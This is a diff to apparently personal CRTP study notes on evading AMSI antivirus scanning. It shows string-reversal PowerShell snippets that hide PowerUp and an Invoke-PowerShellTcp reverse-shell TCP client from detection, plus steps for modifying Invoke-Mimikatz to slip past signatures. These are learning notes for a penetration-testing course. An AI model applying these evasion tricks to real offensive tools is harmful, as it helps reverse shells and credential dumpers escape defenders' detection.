@@ -75,4 +75,42 @@ AmsiTrigger_x64.exe -i C:\AD\Tools\Invoke-PowerShellTcp_Detected.ps1
   -  Modify the detected code snippet
   -  Rescan using AMSITrigger
   -  Repeat the steps 2 & 3 till we get a result as “AMSI_RESULT_NOT_DETECTED” or “Blank”
+- Powerup is a scripted powershell that can scan for privilage escalation on the local machine
+- we run amsitrigger on power up and we found the detected code snipped we reverse it and run amsi again untill we found nothing
+```
+Reverse the "System.AppDomain" string on line number 59
+$String ='niamoDppA.metsyS’
+$classrev = ([regex]::Matches($String,'.','RightToLeft') | ForEach{$_.value}) -join ‘’
+$AppDomain =
+[Reflection.Assembly].Assembly.GetType("$classrev").GetProperty('Cur
+rentDomain').GetValue($null, @())
+```
+- Invoke-PowerShellTcp used to get reverseshell
+- we sacn it using amsitriiger and
+```
+Reverse the "Net.Sockets" string on line number 32
+$String =
+"stekcoS.teN"
+$class = ([regex]::Matches($String,'.',
+'RightToLeft') | ForEach
+{$_.value}) -join ''
+if ($Reverse)
+{
+$client = New-Object System.$class.TCPClient($IPAddress,$Port)
+}
+```
+- this reverse thing is just the easy way not the only way
+- Invoke-Mimikatz is THE most heavily signature PowerShell script!
+- We must rename it before scanning with AmsiTrigger or we get an access denied
+- We need to make the following changes:
+  - Remove the comments.
+  - Modify each use of "DumpCreds".
+  - Modify the variable names of the Win32 API calls that are detected.
+  - Reverse the strings that are detected and the Mimikatz Compressed DLL string
+  
+# Methodology
+- we need to assume breach
+- It is more likely that an organization has already been compromised, but just hasn't discovered it yet
+![simu](https://github.com/Islamkafafy123/CRTP/blob/main/pictures/simu.jpeg) 
+
 
